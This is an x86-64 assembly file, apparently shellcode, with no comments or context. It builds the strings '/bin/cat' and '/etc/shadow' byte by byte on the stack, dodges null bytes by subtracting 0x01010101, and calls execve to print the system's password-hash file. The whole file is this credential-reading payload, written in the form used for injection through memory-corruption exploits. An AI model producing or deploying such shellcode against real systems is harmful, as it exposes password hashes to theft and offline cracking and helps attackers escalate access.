    .section    .text
_start:
    movb $0x2f, 0x0(%rsp)
    movb $0x62, 0x1(%rsp)
    movb $0x69, 0x2(%rsp)
    movb $0x6e, 0x3(%rsp)
    movb $0x2f, 0x4(%rsp)
    movb $0x63, 0x5(%rsp)
    movb $0x61, 0x6(%rsp)
    movb $0x74, 0x7(%rsp)
    mov $0x01010101, %rcx
    sub $0x01010101, %rcx
    mov  %rcx,  0x8(%rsp)
    
    movb $0x2f, 0x9(%rsp)
    movb $0x65, 0xa(%rsp)
    movb $0x74, 0xb(%rsp)
    movb $0x63, 0xc(%rsp)
    movb $0x2f, 0xd(%rsp)
    movb $0x73, 0xe(%rsp)
    movb $0x68, 0xf(%rsp)
    movb $0x61, 0x10(%rsp)
    movb $0x64, 0x11(%rsp)
    movb $0x6f, 0x12(%rsp)
    movb $0x77, 0x13(%rsp)
    mov  %rcx,  0x14(%rsp)
    

    mov  %rcx,  0x28(%rsp)
    lea  0x9(%rsp), %rcx
    mov  %rcx,  0x20(%rsp)
    mov  %rsp,  0x18(%rsp)
    lea  0x28(%rsp), %rdx
    lea  0x18(%rsp), %rsi
    mov %rsp, %rdi
    mov $0x0101013c, %rax
    sub $0x01010101, %rax
    syscall

    add $0xe, %rsp
    mov $0x0, %rdi
    mov $0x3c, %rax
    syscall
    .global        _start
    .end
